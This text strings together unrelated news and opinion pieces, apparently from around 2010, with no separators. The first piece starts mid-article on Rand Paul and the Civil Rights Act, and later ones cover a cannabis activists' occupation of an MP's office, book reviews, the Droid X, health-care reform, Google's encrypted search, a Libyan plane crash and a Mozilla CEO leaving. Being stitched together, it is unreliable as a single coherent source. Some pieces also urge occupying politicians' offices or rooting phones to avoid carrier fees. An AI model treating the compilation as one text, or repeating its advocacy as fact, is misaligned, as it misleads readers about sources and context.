( Or , as the old adage goes , “ Hard cases make bad law . ” )
Once someone ’s private business is transformed by fiat into a “ public accommodation , ” there ’s precious little limit to what government can do with it .
Requiring private individuals to treat black people with a modicum of human dignity is one thing and dictating what kind of oil they can cook their French fries in or how much salt they can put on them is quite another .
But , in principle , they ’re not much different .
All that said , I agree with Doug that this is a pointless and harmful debate for Paul to get sucked into .
This has been settled law since before I was born and a Senate campaign is n’t a political science seminar .
This is the sort of question that more seasoned politicians know how to dodge .
Update ( Doug Mataconis )
I ’ve been generally quite supportive of Rand Paul ’s candidacy , and was quite pleased when he won on Tuesday night , but when I heard about this story late yesterday , starting with the NPR interview that set it all off , I started to cringe .
This is one of those areas where philosophically “ pure ” libertarians get themselves into trouble politically , and it ’s an issue that , quite honestly has no relevance to the 21st Century America .
Paul ’s position is essentially the same one that Barry Goldwater took in 1964 when he voted against the 1964 act due to the provisions of Title II and Title VII covering private acts .
In Goldwater ’s view , the Constitution did not give Congress the authority to regulate purely private behavior .
The Supreme Court held in Heart of Atlanta Motel v. United States and Katzenbach v. McClung , that these provisions were Constitution based upon Congress ’s power under the Commerce Clause .
It is , in all honestly , a tortured interpretation of a Constitutional provision that was originally intended to prevent states from impeding domestic trade , but it was also largely consistent with previous Supreme Court precedent .
I think the decisions are wrong , but they are the law of the land .
The Civil Rights
Act of 1964 is not going to be repealed , and it serves no purpose for Paul to let himself be dragged into a debate about it .
Which is the main reason I cringed when I watched this unfold last night .
It ’s fine for libertarian bloggers to debate this issue among themselves , but a politician can’t allow himself to be trapped into a debate where he ends up defending segregated lunch counters in an election in the South .
The damage is done and these clips will follow Paul from now to November , but he needs to put this issue behind him .
Then , he needs to take a few days off .

CANNABIS CULTURE – A group of Vancouver marijuana activists occupied Conservative MP James Moore ’s Port Moody office on Tuesday to demand an end to the extradition of ‘ Prince of Pot ’ Marc Emery .
At about 11 am , activists from the British Columbia Marijuana Party and Cannabis Culture , including this reporter , stormed through the front doors of the office of Conservative Heritage Minister James Moore .
The lone secretary on duty was shocked and appalled to see the mega - phone wielding group crowd into the small office and gather around the front counter .
“ We ’re going to be protesting in your office today , ” BCMP director Jacob Hunter told the lady working behind the counter .
“ Uh , no you won’t , ” she said looking flustered as she grabbed the telephone and frantically started dialing .
But we did !
We sang chants , shouted drug war facts into the megaphone , and pulled out huge bags of weed and rolled joints on the front counter .
Police showed up shortly afterward and immediately began checking medical cards after seeing the large 200 - gram bag of pot brought by a legal medical patient .
One cop grabbed a bag of weed and threw it across the room to another cop , suggesting that it be confiscated .
He was quickly informed that it was legal and stood down .
At first , police wanted to arrest the protesters for “ assault by trespassing ” but after several minutes of heated debate and negotiations the police called The Crown who told them to leave us alone .
The cops did what they were told ; instead of busting anyone , two unusually enlightened police officers sat with protesters and discussed the destructiveness of the drug war .
By the end of the conversation , we were exchanging email addresses so we could send them info about Law Enforcement Against Prohibition , a group dedicated to ending prohibition .
We soon realized the door to Mr. Moore ’s personal office was wide open , so we made our way in and began looking over his bookshelf and rolling joints on his desk .

Though the protest was fun , we hope it sent a serious message to the Conservative Minister and his party , who have decided to extradited Marc Emery to the USA to face a five - year prison term for selling marijuana seeds and using the money to fund activism .
Marc is a political prisoner , and we will continue to protest , unrelentingly , in new and inventive ways , until he is released .
We will be staging more protests in the offices of Conservative members of the government , and you should too !
Your MP ’s office is public property , and you have a right to protest on public property .
Watch the video and consider holding a protest in your Conservative MP ’s office !

Is there a distinctly American experience ?
“ The American , ” by Henry James ; “ An American Tragedy , ” by Theodore Dreiser ; “ The Quiet American , ” by Graham Greene ; “ The Ugly American , ” by William Lederer and Eugene Burdick ; Philip Roth ’s “ American Pastoral ” and Bret Easton Ellis ’s “ American Psycho ” — each suggests , in its very title , a mythic dimension in which fictitious characters are intended to represent national types or predilections .
Our greatest 19th - century prose writers from Washington Irving , Nathaniel Hawthorne and Herman Melville through Henry James and Mark Twain took it for granted that “ American ” is an identity fraught with ambiguity , as in those allegorical parables by Hawthorne in which “ good ” and “ evil ” are mysteriously conjoined ; to be an “ American ” is to be a kind of pilgrim , an archetypal seeker after truth .
Though destined to be thwarted , even defeated , the pilgrim is our deepest and purest American self .
The young heroines of Curtis Sittenfeld ’s previous novels “ Prep ” and “ The Man of My Dreams , ” like the more mature protagonist of Sittenfeld ’s third and most ambitious novel , “ American Wife , ” are sister - variants of the American outsider , the excluded , disadvantaged , often envious and obsessive observer of others ’ seemingly privileged lives .
Much acclaimed at the time of its publication in 2005 , the tersely titled “ Prep ” is not a brilliantly corrosive adolescent cri de coeur like J. D. Salinger ’s “ Catcher in the Rye , ” still less a powerful indictment of conformist American racist society like Harper Lee ’s “ To Kill a Mocking­bird , ” but an unassuming ­coming - of - age memoirist fiction tracing the adventures and misadventures of a Midwestern girl , Lee Fiora , whose good fortune — unless it ’s her misfortune — is to be a scholarship student at a prestigious New England prep school called Ault .
By her own definition a girl of no more than average intelligence , looks and personality , Lee is yet a sharp - eyed observer of the WASP prep - school milieu , and of her own chronically forlorn presence there ; unlike her prep- school predecessor Holden Caulfield , Lee is not a rebel , but one who unabashedly envies , admires and wishes to adulate her more glamorous classmates .
If Lee Fiora is a 21st - century American - girl pilgrim of sorts , her quest is n’t for a searing and illuminating truth but a girl ’s wish to be “ popular ” with her peers and to be noticed — to be kissed — by the boy of her dreams , Cross Sugar­man : “ I was , of course , obsessed with kissing ; I thought of kissing instead of thinking of Spanish verbs , instead of reading the newspaper or writing letters to my parents .
. . .
But . . . kissing terrified me , as an actual thing you did with another person , and there was no one it would be more humiliating to kiss badly than Cross . ”
“ Prep ” is perhaps most notable for its refusal to make of its protagonist a figure in any way “ heroic ” — her angst is petty , small - minded , but utterly convincing .

The “ American wife ” of Sittenfeld ’s new novel , conspicuously modeled after the life of Laura Bush as recorded in Ann Gerhart ’s biography “ The Perfect Wife : The Life and Choices of Laura Bush ” ( 2004 ) , is a fictitious first lady named Alice Blackwell , née Lindgren , a Wisconsin - born former grade school teacher and librarian who comes belatedly to realize , in middle age , at the height of the Iraq war that her aggressively militant president - husband has initiated and stubbornly continues to defend , that she has compromised her youthful liberal ideals : “ I lead a life in opposition to itself . ”
As a portraitist in prose , Sittenfeld never deviates from sympathetic respect for her high - profile subject : she is not Francis Bacon but rather more Norman Rockwell .
Nearness to the White House and the egomaniacal possibilities of presidential power have not inspired this novelist to wild flights of surreal satire as in the brilliantly executed Nixon - inspired fictions of a bygone era , Philip Roth ’s “ Our Gang ( Starring Tricky and His Friends ) ” ( 1971 ) and Robert Coover ’s “ Public Burning ” ( 1977 ) .
There are no stylistic innovations in “ American Wife ” and very little that is political or even historical .
Sittenfeld ’s prose here is straight­forward and unobtrusive , lacking even the wry asides of the girl - narrators of “ Prep ” and “ The Man of My Dreams , ” whose powers of observation are sharpened by their chronic low - grade depression ;
Alice is never ­other than “ good ” — “ selfless ” — stricken by conscience as she looks back upon the life that has become mysterious and problematic to her , like a life lived by someone not herself : “ Was I mutable , without a fixed identity ?
I could see the arguments for every side , for and against people like the Blackwells ” ( her husband Charlie ’s wealthy , politically influential family ) .
“ Charlie . . . had told me I had a strong sense of myself , but I wondered then if the opposite was true — if what he took for strength was a bending sort of accommodation to his ways . ”
Prospective EVO 4G owners : go ahead and shave $ 29.99 off your expected monthly bill from Sprint .
We ’re still over a week away from the official launch of the phone , and it seems that it ’s already been rooted .
The hackers responsible for the root have n’t released many details at the moment , but they did provide us with several pictures and a video of the hack .
For those unaware ( all 3 of you left ? ) , ‘ rooting ’ a phone is another way of saying that users can now have complete access to a phones operating system ( you can see more details here ) .
We ’ve covered rooting in the past , and most of the more popular Android phones have been rooted for a while , but the EVO 4G is a bit different .
You see , the EVO has the privilege of being the first Android phone with 4G capability – a fact that Sprint ’s not skimping on mentioning ( as apparent by the phones name ) .
What this means is that the phone has the ability to access Sprints ‘ blazing fast ’ 4G network , allowing the phone to download and upload content at near DSL speeds .
For an extra $ 29.99 a month , Sprint will also allow you to use the EVO 4G as a wifi hostpot for up to 8 of your wireless enabled gadgets .
This means that while you ’re on the go , you can use the phone to provide 4G network speeds to your iPad or laptop ( or both ) , for example , simply by connecting to the phone over wifi .
You have the ability to do this now on Sprint ’s network , but you have to buy a separate piece of equipment to do so .
And that brings us to the reason that the EVO 4G being rooted is such a big deal : with a rooted Android device , you currently have the ability to install software that allows you to share your internet connection with other devices over wifi ( or USB ) .
So , once the EVO is released , you ’ll basically be able to circumvent Sprint ’s $ 29.99 per month charge and share your 4G connection with your devices over wifi – for free .
It ’s unclear at this point if Sprint has anything in the works to try and stop this , as they ’ve said that the additional $ 10 month fee that the EVO 4G brings along with it allows you unlimited data on both 4G and 3G , so it ’s not like they can cut you off if you ’re using a lot of data .
Perhaps they ’re just hoping that most users are n’t brave enough to root their phones .
In any event , I guess we ’ll find out soon enough as the phone should be out in a few weeks .

Good luck finding someone who actually thinks the LMRP is going to work .
At best it will capture some of the oil , and at worst , it could cause the spill rate to increase 20 % , since it involves removing the bused blowout preventer , which is mitigating things somewhat .
Today on Face The Nation , Obama environmental advisor Carol Browner said what may have been the most honest thing yet : you should probably expect oil to gush until August .
In other words , the oil - soaked wetlands are just the beginning , in all likelihood .
If you want to read what an environmental nightmare looks , read this account of what the oil could do to the encironmental ecosystem around Florida .

When you start reading this book , you will quickly understand that the authors are affiliated with IBM .
This is nothing wrong per se , but this seems to influence too much the vision that the book proposes , ignoring approaches proposed by others .
Including “ iterative ” in the title seems here to be only a marketing trick used to make it catchy .
They do n’t give you a precise definition of “ iterative ” , saying rather than it is a “ modern method ” ( Tom Gilb was talking about evolutionary development 30 years ago ) and that iterative management is result - based rather than activity - based .
The difference between iteration and increment is not discussed .
The IBM bias is visible when they state for instance that RUP is a “ well accepted benchmark of modern iterative process ” .
The beginning of the book describes the development process , providing a two pages description of COCOMO in the middle of it , and proposes way to improve it .
The solutions focus mainly on an initial emphasis on architecture and modeling ( naturally it is UML with some tools ) associated with the recommendation for code reuse or component integration .
I was hoping to find more useful material in the part dealing with “ practical measurement for software engineering ” .
However the material is arranged around RUP phases and I found only one metric formula in the 50 pages devoted to this topic .
There is some interesting content in this part , but it is only very high level .
This short book is close to be only a white paper for the IBM Rational Unified Process approach .
It contains some interesting material for a software development manager wanting to think about introducing metrics , but its biased IBM approach and lack of directly useful content make it awkward for the experienced development professionals .

Verizon adds new Droid to line of iPhone rivals
Verizon unveiled the Motorola Droid X on Wednesday .
The new smart phone will start selling on July 15 .
NEW YORK ( CNNMoney.com ) -- Verizon Wireless unveiled the latest addition to its a successful line of Droid smart phones on Wednesday afternoon -- preempting Apple 's eagerly anticipated iPhone 4 launch by a day .
The new Motorola ( MOT , Fortune 500 ) Droid X , available exclusively on Verizon 's network , will have all the bells and whistles : a 4.3 - inch display , HDMI output , 720 p high - definition video capture , an 8 megapixel camera , a 1 GHz processor and three microphones to help with noise cancellation and call quality .
The phone can also store an enormous stash of videos , photos and music .
It comes with 8 gigabytes of installed memory plus an SD card featuring 16 GB of expandable memory , which can be upgraded to 40 GB .
All of that comes in a phone less than half an inch thick .
The Droid X is scheduled for July 15 release , and will cost $ 200 with a new two - year contract .
Following in AT&T 's footsteps , Verizon ( VZ , Fortune 500 ) said any customer with a contract expiring in 2010 is eligible for an early upgrade .
( Want all the details ?
Check Fortune.com 's live blog of the Droid launch . )
The Droid X is one of the first phones to take advantage of a cool new feature in Google 's latest Android operating system update :
The phone can become a Wi -Fi hotspot for up to five devices .
That add - on will cost customers an extra $ 20 a month for up to 2 GB of data transmission .
Each additional megabyte will cost 5 cents .
At the Droid X launch event in New York , Google Chief Executive Eric Schmidt praised the phone for its advanced capabilities -- and touted Verizon 's network for allowing users to get the full experience of the Android OS .
" This is not a toy or an app engine , " Schmidt said .
In a not - so - subtle dig at AT&T , he added : " In today 's mobile world ... you need an incredibly fast and scalable network , and it 's got to have a real operating system . "
IPhone - killing strategy
The new Droid is part of Verizon 's attempt to outflank chief rival AT&T ( T , Fortune 500 ) -- the iPhone 's exclusive carrier -- by taking advantage of the surging popularity of Google 's ( GOOG , Fortune 500 ) Android mobile operating system to create a distinctive smart phone brand within Verizon .
Android is a hot wave to ride .
Phones running Google 's mobile OS outsold iPhones in the first quarter , according to research group NPD .
In the first three months of the year , 28 % of U.S. smart phones sales were of Android phones , compared to 21 % for Apple ( AAPL , Fortune 500 ) .
BlackBerry maker Research in Motion ( RIMM ) continued to hold the lead , with 36 % of overall sales .
Though the Android OS may not resonate with most mainstream consumers , Verizon 's $ 100 million Droid marketing campaign has helped establish its Droids as serious iPhone competitors .
" What Verizon has tried to do is create a ' Droid ' brand of their own and establish that brand as a stand - in for the iPhone , " said Charles Golvin , an analyst with Forrester Research .
" That has been pretty successful so far . "
The Droid X will be Verizon 's fourth " Droid " - branded , Android - based smart phone and the second new Droid in two months .
Verizon 's previous flagship device , the HTC Droid Incredible , went on sale in April .
The strategy is paying off : Verizon sold out of Droid Incredibles almost immediately , and the company said it wo n't have any in stock until mid-July .
Meanwhile the original , 7 - month old Motorola Droid outpaced the first - generation iPhone 's sales through its first 74 days in stores , according to research group Flurry .
The Motorola Droid continues selling so well that its manufacturer recently said it is facing shortages in its supply chain .
What Droid does
Droids offer all of the smart phone basics , including a large multi - touch screen , an app store , a video camera and , of course , the ability to place calls .
Like Android phones on other networks , Droids offer free GPS navigation , removable batteries , true multitasking , speech recognition software and frequent software updates .
But unlike other Android phones , which vary wildly in quality and price , Verizon has limited its Droid branding to phones that are truly top of the line .
Not all make the cut : Verizon offers two non -" Droid " Android phones ( the LG Ally and Motorola Devour ) .
And in a very anti-Apple approach , each Droid has a different set of features .
Want a keyboard ?
Get a Motorola Droid .
Want to watch video ?
Get a Droid X . Want a great camera ?
Try the HTC Droid Incredible .
Like something a bit smaller ?
Get an HTC Droid Eris .
" Clearly , Verizon has been making great strides to bring only top - notch handsets into its Droid portfolio , " said Andy Castonguay , director of mobile and access devices research at Yankee Group .
" Verizon 's strategy to have a variety of devices centered around one core experience makes sense . "
Still , there 's a risk to Verizon 's approach .
Each Droid runs a different user interface , some use a slightly different version of the Android operating system , and each has different apps available to it .
And with new Droids launching at such a rapid pace , it can be difficult for customers to keep track .
With the iPhone , on the other hand , users know they 'll have one update a year and a full , standardized universe of apps .
" It will take some time to see whether this is too much or too fast for Verizon , " Golvin said .
" But so far , Verizon has had success in saying Droid is the flagship brand that does n't force you to use one set of features . "
AS OF yesterday , America had the most screwed - up health - insurance system in the developed world .
As of today , America probably still has the most screwed - up health - insurance system in the developed world , but it 's significantly less screwed - up than it was yesterday .
The American health - insurance system we had yesterday was screwed up in many , many ways , but the most fundamental symptom of its dysfunction was that it failed to insure 17 % of the population .
Today , we are on the way to getting 95 % of Americans insured by the end of the decade .
The law will do that in part through increasing efficiency .
In part , however , it 's going to extend government subsidies so that more people can buy insurance .
It pays for those subsidies in two ways : it taxes the rich ; and , more importantly , it redistributes existing government benefits from those who have them to those who do n't .
As the New Republic 's Jonathan Chait and Jonathan Cohn have written , that redistributionist element is increasingly the focus of the opposition to the reforms : many opponents are voicing a simple blanket rejection of the idea that the wealthy or fortunate should be obliged to sacrifice anything to help out the poor or the unfortunate .
But here 's the thing : many of the people who think of this as a government effort to take their benefits away , and give them to someone else , do n't realise that right now , they 're unjustly benefiting from discrimination by the government and by insurance companies .
To a large extent , this reform is n't about Robin Hood - style taxing and spending .
It 's about taking the Robin Hood - style taxing and spending we 're already doing , and shifting it around so it 's more fairly distributed .
Let 's look at how this works .
First of all , the government subsidises health insurance for people who work at large companies by making health insurance tax - free for employers .
That employer health - insurance tax exclusion amounts to about $ 250 billion a year , almost three times the cost of the bill Congress passed yesterday .
Those government subsidies go only to people who have jobs at companies that offer insurance .
The self - employed , the unemployed , and employees of companies ( mainly small businesses ) that do n't offer benefits have to buy insurance themselves , on the more expensive individual market , with no tax subsidy .
There 's no rhyme or reason to this discrimination , but it 's one of the major reasons why many people do n't have health insurance .
The new law takes a step towards reducing that discrimination by capping the exclusion , taxing the health - insurance plans of people who get very high - value " Cadillac " insurance ( worth more than $ 27,000 for a family policy ) through their employers , and using that money to pay for subsidies to low - income people ( earning up to 400 % of the poverty level ) who have to buy insurance on the individual market .
Second , under the old system , insurers demanded that people who had been sick in the past , and were thus more likely to become sick again , pay much more for insurance .
There 's nothing evil or dastardly about insurers doing this .
In an unregulated system , they have to operate this way ; if they did n't , they would go out of business .
But the idea that people who get sick should have to pay vastly more for insurance violates people 's basic ideas of fairness , and indeed the entire concept of insurance .
( A health - insurance system that can't insure people who are likely to get sick is pretty clearly not doing the job society needs it to do . )
Essentially , the old system forced insurers to discriminate against people who were prone to sickness , and in favour of people who were n't .
Americans strongly agree that insurers should not be allowed to discriminate on price against people with pre-existing conditions .
( An ABC / Washington Post poll in early February found 80 % agreed the government should bar insurers from rejecting those with pre-existing conditions . )
With health - care reform passed , insurers will have to stop rejecting sick people , or charging them more , beginning in 2014 .
And this is n't a problem for insurers , either .
As long as no company can discriminate against pre-existing conditions , the playing field stays level ; insurers have not opposed this part of the reform .
Third , under the old system , a lot of healthy younger people decided that premiums had risen so high that it was n't worth it for them to buy insurance .
They figured they were better off taking their chances .
In so doing , they were freeloading off of the rest of society .
In America , emergency rooms are obligated by law to treat anyone , regardless of their insurance status .
( That 's because Americans are decent people who do n't believe you should die because you 're poor . )
But healthy people who forego insurance are playing the same game as " too big to fail " financial institutions : they know that ultimately , if they 're hit by a car , the hospital will have to treat them , and if they can't pay the full cost , the rest of society will , through higher treatment costs and insurance premiums .
They 're drawing the emergency - care benefits of the American health system , but they have n't paid their dues .
The new law fixes this by mandating that everyone buy insurance .
If you can't afford it , you 'll get subsidies to help .
But it will no longer be possible for healthy people with adequate incomes to decide they 'd rather spend that money on a nicer car , and let the rest of us pay for their care when they fall ill .
Fourth , and most controversially , there is the issue of Medicare .
Under America 's old system , there was a vast disparity between 55 - or 60 - year - olds and 65 - year - olds .
Once you hit 65 , you were more or less set .
For the ten years before that , you 'd been more or less screwed .
Your premiums were much higher than those of younger people , and unless you were truly indigent and qualified for Medicaid , there was no government help .
The new system limits the degree to which premiums can discriminate based on age , and it provides subsidies for those who can't afford private - sector premiums but are n't poor enough for Medicaid .
It gets some of the money for those subsidies by cutting Medicare spending .
And it gets much of the rest by raising Medicare taxes on the rich ( specifically , from 1.45 % to 2.35 % of income , for those with earnings above $ 250,000 ) .
Now , some of these Medicare cuts will be pure fat ; there 's no reason why the Medicare Advantage programme should be paying for - profit private companies to do a job the government does more cheaply .
( Indeed , paying for - profit private companies to do things the government does more cheaply seems to have become a bit of an epidemic over the past 25 years . )
And studies show that perhaps one - third of Medicare spending generates no difference in health outcomes .
The new MedPac commission should be able to identify and cut out a lot of non-productive treatment practices .
Some of the cuts , however , may represent real reductions in care .
But look : America created Medicare because it wanted to guarantee health care for its seniors .
It 's unfair to create an absolute guarantee of first - rate health care for anyone 65 or over , while doing nothing at all for the middle - aged , leaving many of them unable to obtain any kind of coverage .
Seniors may need to accept some limits on public spending on their health care in order to provide subsidies so that non-seniors can afford health insurance , too .
And using an increase in direct Medicare taxes to free up money to make insurance affordable for working - class non-seniors seems fair .
There is one piece of old - fashioned redistribution involved in the new law .
Because the cap on the employer health - insurance tax exclusion was unpopular with labour , businesses , and the public , the Obama administration postponed its implementation and made up for some of the revenue with a 2.9 % surtax on investment income for families earning over $ 250,000 .
That sort of tax on the wealthy may be unpopular with the Tea - Party crowd .
But it 's extremely popular with the country as a whole .
In January another ABC / Washington Post poll found the public preferred this approach to capping the tax exclusion for Cadillac plans , 58 % to 22 % .
In short , those who oppose this bill because it 's a Robin Hood bill are not wrong .
It does involve redistribution .
But that redistribution is largely about reducing the unfairness of redistribution that already exists .
There 's no reason why taxpayers should be subsidising the health - insurance premiums of people who work for large companies but not those who own small businesses , why sick people who pay high insurance premiums should be subsidising the emergency - room guarantee for healthy young people who choose not to buy insurance , or why we should all be paying the insurance premiums of a wealthy 65 - year - old while doing nothing for a working - class 64 - year - old .
The new system is n't going to eliminate the unfairness and discrimination in the American health - insurance system ; we did n't turn into the Netherlands overnight , let alone France .
But we do wake up today with a system that 's significantly less unfair than it was yesterday , and most of that has to do with a fairer distribution of the benefits the government was already handing out .

It was recently announced that Office creators Ricky Gervais and Stephen Merchant are at work on a new sitcom called Life ’s Too Short , starring Warwick Davis , the British actor best known for Willow , the Harry Potter movies , and being unceremoniously kicked to ground by Gervais in the Daniel Radcliffe episode of Extras .
Yesterday , Gervais called from London to give us the lowdown on his latest project .
“ It ’s a single camera sitcom following the trials and tribulations of ‘ Warwick Davis , showbiz dwarf , ' ” explained the comedian .
“ Warwick is playing a twisted version of himself .
He ’s quite conceited and arrogant and manipulative .
And he runs a [ small person ] talent agency , which he does in real life .
Me and Steve Merchant pop up as ourselves , just to add some realism .
Warwick comes round and says , ‘ Doing any more Extras ?
Got any work ? ’
And we go , ‘ Ooh , no , not really . ’
And we try to get rid of him .
It ’s fantastic .
We did some casting today .
I ’m off to America for some shows and then I come back after that and we shoot a little pilot , just like we did with The Office ten years ago , and then we ’ll see . ”
Google users can now run encrypted searches using the company ’s flagship search site simply by navigating to https://www.google.com.
UPDATE : Many users are being redirected to the non-encrypted main site — a function of Google rolling this out to all its servers .
Also it is necessary to include WWW .
Do n’t assume your searches are encyrpted , unless the url starts with HTTPS and you see the lock icon .
The move brings the same web security system that protects online banking , website logins and shopping to search — a first for a major search engine .
The encryption makes it incredibly difficult for anyone in between your computer and Google ’s servers to see what search terms you use or what results Google sends back .
Additionally , when you click through a search result on Google ’s new secure page , your browser will not send along “ referrer data ” revealing the search terms you used .
The new option does not , however , keep Google from knowing and storing what you searched on and does not make you anonymous to them .
It ’s designed to prevent eavesdroppers from analyzing the URL or content to see the search terms you are sending to Google , or the results .
With HTTPS on , all an eavesdropper can see is that you are using Google .
When not using SSL , a user of a school or corporate network can have their e-mail and web traffic read by those who control the network , while anyone using an open Wi-Fi connection can have their traffic sniffed by a hacker using simple tools .
HTTPS will be an option , not the default , though users have the ability to set the search bars in their browsers to use it as their default .
The page will have a different logo and not include links on the search page to Google ’s map and image search , since those do not yet have an HTTPS option .
The encrypted option is perhaps most useful for routing around censorship from countries like China , which often block searches on politically sensitive terms .
However , HTTPS is only an option currently for Google.com , not for country specific sites like Google.
co.hk , the Hong Kong - based search that Mainland Chinese users are being directed to as a way for Google to stop running a censored search engine in China .
Non-English speaking users who want encryption need to use Google.com for now , choosing results in their preferred language — though this loses much of the local features that country - specific Google search sites offer .
Google ’s embrace of HTTPS could begin a move by web services such as social networks to begin offering encryption for more than just logins .
Such increased adoption would cut down on network eavesdropping and also have the added benefit of preventing some online attacks .
Ironically , the new option came after the search company admitted it had been mistakenly eavesdropping and recording what people were doing on unencrypted Wi -Fi networks as its Street View cars were taking pictures of cities around the world and recording the IDs of Wi-Fi networks and routers .
That data is used to help geolocate people using devices without GPS , but the company said for years it was not collecting session data .
It ’s doubtful Google collected very much info on any one user — as the cars are constantly in motion and cycling through the channels used for Wi -Fi , but now users of https://google.com would be safe from any similar effort .
Google turned on encryption — better known as https :// — as a default for Gmail users earlier this year .
Gmail was the first major webmail service to offer encryption for full sessions , rather than just for logins .
Google allowed power users to use https :// for years , and under pressure from privacy and security advocates turned it into the default for all users earlier this year .
Microsoft ’s new version of Hotmail , available sometime this summer , will allow users to choose HTTPS or not , but is n’t making it the default .
Using HTTPS , rather than HTTP , is not technically difficult for smaller sites , but the authenticating handshakes between a server and a browser do require more resources from both a server and the browser .
That means it costs a company more to run a service and can slow down an application .
Google says it ’s been working for several months on the service , and that it ’s not simple , given that it search results are blended — combining information from a number of services , including YouTube , that did n’t have the capability to send information via HTTPS .

Eight - year - old boy ' is only survivor ' as plane with Britons among 104 on board crashes in Libya
Al Afriqiyah Flight 8U771 from Johannesburg was due to stop in Tripoli
Foreign Office trying to confirm number of Britons on board
Seven passengers had been due to connect to another flight to Gatwick

96 bodies retrieved from crash site so far
61 of the dead are Dutch ; the rest believed to be British , South African and Libyan
An eight - year - boy from Holland was the sole survivor out of 104 passengers and crew on a Libyan Airbus which crashed in landing at Tripoli airport this morning .
The flight from Johannesburg was due to land in Tripoli just after 6 am today .
Earlier , airline officials had said it was due to continue on to Gatwick after the stop , however officials later clarified that seven passengers had been due to make a connecting flight to Gatwick in Tripoli on another plane .
It is believed that there were Britons on board .
The Foreign Office is still trying to confirm how many passengers were British .
' All of the passengers and crew died except one child ...
There were 93 passengers and 11 crew on board , ' the source said .
' It disintegrated ' : Police and rescue workers stand among the mangled remains of Al Afriqiyah Flight 8U771 , which crashed on landing at Tripoli airport this morning
Horror :
All of the 104 on board died in the crash , save one - believed to be an eight - year - old Dutch boy who was thrown clear as the plane exploded on impact
Flight 8U771 from Johannesburg crashed just one metre from the runway , exploding on impact and ' completely disintegrating ' , aviation sources told the MailOnline .
The Dutch boy appears to have been miraculously flung to safety from the wreckage , the source said .
He has been rushed to hospital , where he is being treated for various injuries including broken bones .
‘ It ’s an absolute miracle that he got out , ’ said one .
‘ He ’s been rushed to hospital in Tripoli , but it ’s hard to tell what kind of condition he ’s in .
‘ The plane crashed next to the runway .
It was around a metre away .
' The body of the plane completely disintegrated , meaning most people would have died straight away . ’
Of the 96 so far confirmed dead , 61 were Dutch .
There were 22 Libyans on board the flight , including all 11 of the crew .
The rest of the passengers had several different nationalities , said the official , apparently including Britons and South Africans .

Airports Company South Africa spokeswoman Nicky Knapp said it was still too soon to say for sure whether any of the victims were British .
But she confirmed the seven had been due to disembark the doomed aircraft in Tripoli and board another plane for London .
Dozens of others were scheduled to take connecting flights to other European destinations .
Speaking at a press conference at OR Tambo airport in Johannesburg , Mrs Knapp said : ' Seven passengers were due to board another plane to Gatwick after landing in Tripoli .
' 32 were due to board a plane for Brussels , 42 for Dusseldorf and one for Paris .
' Eleven passengers were due to end their journey in Tripoli . '
An Afriqiyah staff member in Johannesburg said it was ' likely ' that British passengers were on board the Airbus 330 .
She added : ' We are waiting to get confirmation of the full passenger list at the moment .
' Once we have that we will know for sure the nationalities that were on board .
' At this stage I would say it is likely that there were British nationals on board .
' The airline uses Tripoli as its hub but routes through to London , Paris and other destinations . '
The British Embassy in Libya confirmed a team had been dispatched to the airport in Tripoli to confirm whether British nationals had died .
Deputy Consul Arvinder Vohra and local staff have been in meetings with the airline to determine victims ' identities .
Embassy spokesman David Clay said : ' Libyan officials informed us of the crash at 7 am local time and sent representatives straight to the airport .
' They are talking to whoever they can to work out what happened and who was on board flight 8U771 .
An unidentified man walks among the debris , spread far over the crash area this morning
' Everyone in the office is also working as fast as possible to get a clearer picture of the situation but the investigation is still in its early stages .
' We have reports that British nationals were on board and are trying to verify this . '
A British High Commission spokesman in Pretoria said officials in South Africa were also working on the case .
He said : ' We are in constant contact with our colleagues in Tripoli . '
Libyan state television showed a large field scattered with small and large pieces of plane debris .
Dozens of police and rescue workers with surgical masks and gloves walked among the wreckage , some of them carrying at least one body away .
They gathered small personal items such as wallets and cell phones from the wreckage .
Others sifted through debris - some of it still smouldering - including a flight recorder and green seats with television screens on them .
Libyan television showed images of debris on the ground .
The plane is said to have been just one metre from the runway when it crashed
A large piece of the plane 's tail was visible , bearing Afriqiyah 's brightly coloured logo with the numbers ' 9.9.99 , ' a reference to the date of the founding of the African Union .
The airport road into Tripoli – which is some 15 miles away – was this morning full of ambulances and other emergency vehicles including numerous fire engines and police cars .
Weather conditions over Tripoli 's international airport were good today , with three - mile visibility , scattered clouds at 10,000 feet and winds of only three miles per hour .
Daniel Hoeltgen , spokesman for the European Aviation Safety Agency said Afriqiyah has undergone 10 recent safety inspections at European airports , with no significant safety findings .
He said a team of French crash investigators was already on its way to Tripoli .
' We are currently talking to Airbus and with the French accident investigator BEA , which will be involved in the investigation , ' said Hoeltgen .
The plane 's flight recorders have been recovered .
Terrorism has already been ruled out as a cause of the crash .
Afriqiyah Airways is not included on the European Union 's list of banned airlines .
The list has nearly 300 carriers deemed by the EU not to meet international safety standards .
According to initial reports , the plane crashed as it neared the threshold of Tripoli International 's main east - west runway , while preparing to touch down from the east .

Locals said the weather had been clear at the time of the crash today
The main runway at Tripoli Airport is 3,600 yards long .
According to international airport guides , it is not equipped with an Instrument Landing System .
This all - weather , precision approach system guides descending planes down to the threshold of the runway .
But it does have two other systems that many other airports use worldwide - a high frequency omnidirectional radio system that pilots use to navigate their aircraft , and a non-directional beacon that also helps guide planes into the airport .
The BBC has reported that the Afriqiyah Airways flight from Johannesburg had been due to land at 0610 local ( 0410 GMT ) .
The airline had said earlier today that a search and rescue operation was underway .
Later this morning it said that mission was over .
Al Afriqiyah is a Libyan airline that started in 2001 .
An aerial view of the Tripoli airport ( file photo ) , where the plane crashed just before landing today
It is a small budget airline which only operates 13 planes .
They have an average age of 6.9 years .
All of Afriquiyah ’s 300 odd staff are Libyans , including the entire crew of the plane which crashed .
Until today it had an impeccable safety record , with this morning ’s disaster being by far the worst accident in its nine - year history .
It mainly operates on African routes , but international destinations include London , Paris , Rome and Amsterdam .
It was at first fully owned by the Libyan state .
The company 's capital was later divided into shares to be managed by the Libya - Africa Investment Portfolio .
On April 21 , the airline announced that flights were back to normal after disruptions due to the volcanic ash cloud from Iceland that grounded flights in Europe last month .
Last June , a 14 - year - old French girl was the sole survivor of a Yemeni plane crash off the Comoros Islands .
Bahia Bakari attributed her survival to being ‘ ejected ’ from the Airbus A310 which broke up on a flight from Paris .
She is thought to have escaped through a small gap in the broken fuselage .
I just announced internally that after 5 years at Mozilla , and a couple as the CEO , I ’ve decided to leave later this year to join Greylock Partners as a venture partner .
I ’ll be in my role here at Mozilla until we conclude a successful search for a new CEO , and intend to stay involved and on the Board of Directors .
I ’ll have more to say about Mozilla over the next few months as we go through transition —
I ’m incredibly proud of the work we ’ve done over the last several years , and very optimistic about what the future holds .
